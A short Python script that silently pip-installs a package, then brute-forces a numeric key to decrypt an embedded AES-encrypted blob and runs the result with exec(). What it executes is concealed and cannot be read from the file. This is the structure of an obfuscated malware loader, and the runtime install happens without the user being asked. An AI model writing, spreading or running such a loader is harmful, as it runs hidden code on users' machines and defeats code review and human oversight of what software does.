from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import os,random,base64
os.system("pip3 install easygui")
import easygui
print("Developed by Neelanjan Manna")
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'\x91\x1e\xde9%\xde\x10\xe5\x14\x9b\xb1\xe8r.\x05\xd8\r\x8c\xf4]\x19\xabZS\x18\xa7/\xd1\x92\xc5d\xfe\xdc\x99q\x83W\xf6Q-\xf8\x99\x1c\xe1\x0fm\xcc\xdemj\x97\xa22F\x17!\x9b<\x99\xe0\xee\xda\xad\xfe\xf7\x7f\xdbJ|1^\x80\xad\x85\xb1\x82\x19\x89\xaa\xf8\xd0;\x97\x94\xd7\xac)Dq\xa9A\xee%*p\xeb\xf5S\xa7\xf4*T\xa6\x13\x0e7\xc0R\xa1\xc7\x8e\xaf\xcb\xe9\xf5\xf8\x04\xa7\xc9\xaa\xc5\x85 \xc9\xaa\x84x\xc0\xef\x19\x12\x17\xe1\xf8E\x8a}\x81\x9d74L\x82?c;\xcc\x94\x8c\'\xff[\xc7\x0b\xa5\xd9rU\x06(\xb1\r\xe0T\r\xbdK\x1b\xd1\xc8\t\x7f?\x98\x8a\xeaI\xd9r\xdbO\x89\'\xff\x87B\xde\x8a\xebO)\x96\x87+\x8e\x8c\xedV0\xe7\xf0\xde>\xee\x95f\xd5\x85\xfe1\xbb\xf7HY\x08*z|\x88Lx\xee1\xe4*\xd9g\x04\x0e\x18\xf5m\xe5QL\xa0\xb6\xb9\x99JR\xdb/\xba\xaf\xebF\x92\x06\x010\x1d\x8a|\x02Vfm\x88I\xad\x04{ftu\x13\xdd\x8b\xb2\rC\xec\x91\x7f_\x1b.\x08\x99|\x83\xad"\x18zE\xa5\xcf\xbfk\xebK\x072\x0cv\xd8R\xc0\xd7=\x12\xbf\x1e\t\xb0Uq\x9d-\xff\x04@\x90\xd6\xc8b\xbcG\xc18ug\x0bM\xc5.\x1d\xe0\x1f\x03w\x0c\xef\x83]v\x99r\x8a\x12\x91\x03\xe8Z\xfc\xf7\x9agY\x1b\x07\xf8\xcf\x87\xf9{\x1dB\xd5(\xdf\n\x99\xa7b\xecIU0X\x83\xa8\xb7;\xf2\x86V%*\x1aN\xbf\xb1\x97f\x8d\x972;\x1f{\x1e\xf0#\xed\x89j\xf13\xc6\x105\xc1\xe8\xdcw\x10a\xce\x16\x83\x07\xbe\xb1\x0b\x80\\\xf3lg.\x1b\x0eE\xb0@j\xad[\x01\x8fl\x87\xb1\xbdLr\x8f\x9b\x10\xac\x0e}?\xfcdn)V\xb6,MmR\x88\x10\xc9j\x969C\xb9\xb0*M9\xb3\xd9\xe3\x19\xe73}\xf6\xfc\xa7\xde\xc0\x7f\xfc\xb9\x9c\x06\x13N\x87\xa8STF\xcc\x89c\x8bxn\xfd\t\x94\x84\xdfQ\xe7\xb5\xfd\xf1\x1a\x0f>\x1f\xf7B1#\t$$\x0b/w\xa1\x00>\x89\xbfo\xcdL\xae;sS\xc5\xa9\x073\xe1\xe8<\x026_\xf2\xdf\xaa\x97\x8aK\xbd$e\x15\x17vn\xb9\'\xce\xf1\xde\x87:C\x99\x15\x84\xdc\x8e\xdf\xde\x8a\xad \xd8&\xf6\xf7\xe9\xa0\x05\x12|\xa0\xf3\x01\xa7\x90v\xf8M\x8aT\x0f\xe9\xfdB\xfb\xb8g\'\xc3]\x8a}L\x8d\xd7\xe3\xb7\xe0aK(\xc3U\xe6\xd6\x8c\xfa\xd7&\xfa\xd1#\x95\x94z&O\xfc\xe6\xd7\xa8x&\xa7\xad\xaa\x15S\x8f\xde\xf4D\xd7\xb2(\x12\xd6~QL\x13\xf9'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
